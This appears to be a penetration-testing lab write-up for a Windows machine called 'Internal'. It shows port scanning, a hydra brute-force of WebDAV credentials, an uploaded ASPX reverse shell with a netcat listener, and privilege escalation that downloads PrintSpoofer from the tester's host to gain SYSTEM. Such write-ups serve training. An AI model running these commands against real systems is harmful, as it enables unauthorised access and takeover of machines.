# 🪟 Internal

> WebDAV brute / SeImpersonatePrivilege

### Enumerating Services
First, we'll perform a generic scan to identify the open ports and services running on this machine.
```shell
# TCP
sudo nmap -sCV -p- --min-rate=10000 -Pn 192.168.182.40

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0
49664/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
### Enumerating port 80
```shell
# Enum dir
feroxbuster -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -d 1 -x php,asp,aspx,html,txt -C 404,502 -u http://192.168.182.40

http://192.168.182.40/webdav
```
### Initial Access
We brute-forced WebDAV credentials and uploaded an ASPX reverse shell.
```shell
# Brute Force WebDAV
hydra -L /usr/share/wordlists/metasploit/http_default_users.txt -P /usr/share/wordlists/metasploit/http_default_pass.txt 192.168.182.40 http-get /webdav/
wampp:xampp

# Upload webshell
cadaver http://192.168.182.40/webdav
put shell.aspx

# Listener
rlwrap -cAra nc -vnlp 443
```
### Privilege Escalation
```shell
# Tokens
whoami /priv
SeImpersonatePrivilege  Enabled

# Transfer PrintSpoofer
iwr -uri http://192.168.45.242/PrintSpoofer64.exe -outfile PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c cmd
```
### Post-Exploitation
```shell
# Evidence
ipconfig
type C:\Users\Administrator\Desktop\proof.txt
```
